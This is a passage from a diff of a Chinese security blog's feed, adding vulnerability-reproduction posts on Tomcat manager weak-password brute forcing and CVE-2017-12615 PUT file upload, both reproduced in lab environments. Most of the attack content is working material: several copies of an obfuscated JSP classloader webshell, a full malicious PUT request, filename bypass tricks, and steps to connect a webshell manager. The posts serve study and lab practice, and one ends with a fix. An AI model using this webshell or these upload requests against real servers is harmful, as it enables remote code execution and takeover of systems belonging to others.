+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show options
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;将 rhosts 设置为目标机&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set rhosts 172.16.2.174
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;进行爆破&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904142741.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+这里成功爆破出账号/密码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;点击 Manager App 进行登录&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155742.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;strong&gt;登录后找到上传点&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155816.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war&lt;br&gt;
+jsp 一句话木马，密码为123&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;%  String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;上传111.war文件&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160012.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160033.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161029.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;上蚁剑&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.197.140:8080/11/11.jsp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;密码：pass
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161012.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>【Tomcat漏洞复现】CVE-2017-12615任意文件写入</title>
+        <link>http://localhost:57441/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</link>
+        <pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:57441/p/tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</guid>
+        <description>&lt;img src="http://localhost:57441/images/34.webp" alt="Featured image of post 【Tomcat漏洞复现】CVE-2017-12615任意文件写入" /&gt;&lt;h1 id=&#34;漏洞详情&#34;&gt;漏洞详情&lt;/h1&gt;
+&lt;p&gt;当 Tomcat 运行在 Windows 系统且启用了 HTTP PUT 方法（通过将 &lt;code&gt;readonly&lt;/code&gt; 参数设置为 &lt;code&gt;false&lt;/code&gt;）时，攻击者可构造恶意请求上传 JSP 文件，导致服务器执行任意代码，进而引发数据泄露或服务器权限被控制。&lt;br&gt;
+&lt;strong&gt;关键点：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;触发条件&lt;/strong&gt;：需手动修改 &lt;code&gt;conf/web.xml&lt;/code&gt; 文件中的 &lt;code&gt;readonly&lt;/code&gt; 参数为 &lt;code&gt;false&lt;/code&gt;（默认值为 &lt;code&gt;true&lt;/code&gt;，PUT/DELETE 方法被禁用）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;绕过限制&lt;/strong&gt;：Tomcat 默认通过 &lt;code&gt;JspServlet&lt;/code&gt; 处理 &lt;code&gt;.jsp&lt;/code&gt; 文件的上传，但攻击者可通过以下方式绕过限制，使文件由处理静态资源的 &lt;code&gt;DefaultServlet&lt;/code&gt; 处理：
+&lt;ul&gt;
+&lt;li&gt;文件名后添加空格（&lt;code&gt;evil.jsp%20&lt;/code&gt;，利用 Windows 不允许文件名以空格结尾的特性）。&lt;/li&gt;
+&lt;li&gt;使用 NTFS 文件流特性（&lt;code&gt;evil.jsp::$DATA&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;文件名后添加斜杠（&lt;code&gt;evil.jsp/&lt;/code&gt;，此方法甚至影响 Linux 系统及 Tomcat 5.x-9.x 版本）4711。&lt;br&gt;
+&lt;strong&gt;影响范围：&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;受影响的 Tomcat 版本&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;Apache Tomcat 7.0.0 至 7.0.81（官方公告范围）。&lt;/li&gt;
+&lt;li&gt;部分测试显示 Tomcat 8.5.19 等版本也可能受影响。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：主要针对 Windows，但通过添加斜杠的绕过方式（&lt;code&gt;evil.jsp/&lt;/code&gt;）可扩展至 Linux 系统。&lt;br&gt;
+&lt;strong&gt;攻击思路：&lt;/strong&gt;&lt;br&gt;
+​ 上传木马文件，webshell管理工具进行连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h1&gt;
+&lt;p&gt;使用vulhub进行搭建：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd vulhub/tomcat/CVE-2017-12615
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker-compose up -d
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker ps
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.197.140:8080/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133115.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;burpsuite抓包&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133228.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+使用&lt;code&gt;webshell generate&lt;/code&gt;快速生成木马，项目地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://github.com/cseroad/Webshell_Generate
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133326.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+一句话木马：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;%  String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将生成的木马上传。这里使用&lt;strong&gt;PUT&lt;/strong&gt;方法进行上传，文件名可以是&lt;code&gt;/xxx.jsp/&lt;/code&gt;、&lt;code&gt;/xxx.jsp%20&lt;/code&gt;、&lt;code&gt;/xxx::$DATA&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PUT /123.jsp/ HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 192.168.197.140:8080
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip, deflate, br
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: keep-alive
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Upgrade-Insecure-Requests: 1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Priority: u=0, i
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 946
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;%  String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133512.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+返回&lt;strong&gt;201&lt;/strong&gt;即上传成功，使用蚁剑进行连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.197.140:8080/123.jsp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;密码：123
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133602.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;绕过姿势&#34;&gt;绕过姿势&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.Windows下不允许文件以空格结尾以
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2.WindowsNTFS流
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Put/a001.jsp::$DATA HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3. /在文件名中是非法的， 也会被去除（Linux/Windows） 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Put/a001.jsp/http:/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;修复建议&#34;&gt;修复建议&lt;/h1&gt;
+&lt;p&gt;把readonly 改成true&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;init-param&amp;gt; &amp;lt;param-name&amp;gt;readonly&amp;lt;/param-name&amp;gt; &amp;lt;paramvalue&amp;gt;true&amp;lt;/param-value&amp;gt;&amp;lt;/init-param&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞</title>
-        <link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+        <link>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
         <pubDate>Wed, 03 Sep 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
-        <description>&lt;img src="http://localhost:1313/images/30.webp" alt="Featured image of post 【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞" /&gt;&lt;h1 id=&#34;0x00-简介&#34;&gt;0x00 简介&lt;/h1&gt;
